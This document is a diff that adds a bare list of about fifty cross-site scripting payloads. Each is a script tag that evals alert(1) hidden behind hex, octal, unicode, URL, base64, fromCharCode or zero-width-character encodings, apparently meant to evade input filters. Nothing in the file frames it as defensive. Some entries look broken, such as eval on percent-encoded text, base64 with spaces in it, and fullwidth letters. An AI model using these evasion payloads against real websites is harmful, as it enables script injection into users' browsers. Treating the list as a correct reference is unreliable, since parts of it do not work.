@@ -1,0 +1,49 @@
+<script>eval('\x61\x6C\x65\x72\x74(1)')</script>
+<script>eval(unescape('%61%6C%65%72%74%281%29'))</script>
+<script>eval('\141\154\145\162\164(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval('\u0061\u006C\u0065\u0072\u0074(1)')</script>
+<script>eval('\u{61}\u{6c}\u{65}\u{72}\u{74}(1)')</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval('\uFEFFalert(1)')</script>
+<script>eval('\377\376a\0l\0e\0r\0t\0(\01\0)')</script>
+<script>eval(decodeURIComponent('%61%6C%65%72%74%281%29'))</script>
+<script>eval('\x61lert(1)')</script>
+<script>eval('\x61\x6c\x65rt(1)')</script>
+<script>eval('\x61\x6c\x65\x72t(1)')</script>
+<script>eval('\x61\x6c\x65\x72\x74(1)')</script>
+<script>eval('%61%6C%65%72%74(1)')</script>
+<script>eval('%61lert(1)')</script>
+<script>eval('al%65rt(1)')</script>
+<script>eval('ale%72t(1)')</script>
+<script>eval('aler%74(1)')</script>
+<script>eval('\141lert(1)')</script>
+<script>eval('\141\154ert(1)')</script>
+<script>eval('\141\154\145rt(1)')</script>
+<script>eval('\141\154\145\162t(1)')</script>
+<script>eval('\141\154\145\162\164(1)')</script>
+<script>eval('\u0061lert(1)')</script>
+<script>eval('\u0061\u006cert(1)')</script>
+<script>eval('\u0061\u006c\145rt(1)')</script>
+<script>eval('\u0061\u006c\u0065\162t(1)')</script>
+<script>eval('\u0061\u006c\u0065\u0072\164(1)')</script>
+<script>eval(atob('Y W x l c n Qo M S k ='))</script>
+<script>eval(atob('YWxlcnQoMSk=').replace(/ /g,''))</script>
+<script>eval(atob('Y W x l c n QoMSk='))</script>
+<script>eval(atob('YWxlcn QoMSk='))</script>
+<script>eval(atob('YWxlcnQoIDEp'))</script>
+<script>eval('\377\376\141\0\154\0\145\0\162\0\164\0(\01\0)')</script>
+<script>eval('\ufeff\u0061\u006c\u0065\u0072\u0074(1)')</script>
+<script>eval('\u200Balert(1)')</script>
+<script>eval('\u200Calert(1)')</script>
+<script>eval('\u2028alert(1)')</script>
+<script>eval('\u2029alert(1)')</script>
+<script>eval('\u2060alert(1)')</script>
+<script>eval('\uFEFF\u0061lert(1)')</script>
+<script>eval('\uFF41\uFF4C\uFF45\uFF52\uFF54(1)')</script>
+<script>eval('\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}(1)')</script>
+<script>eval('\u{61}lert(1)')</script>
+<script>eval('\u0061\u{6c}ert(1)')</script>
+<script>eval(decodeURI('%61%6C%65%72%74(1)'))</script>
+<script>eval(unescape('%u0061%u006C%u0065%u0072%u0074(1)'))</script>
+<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>
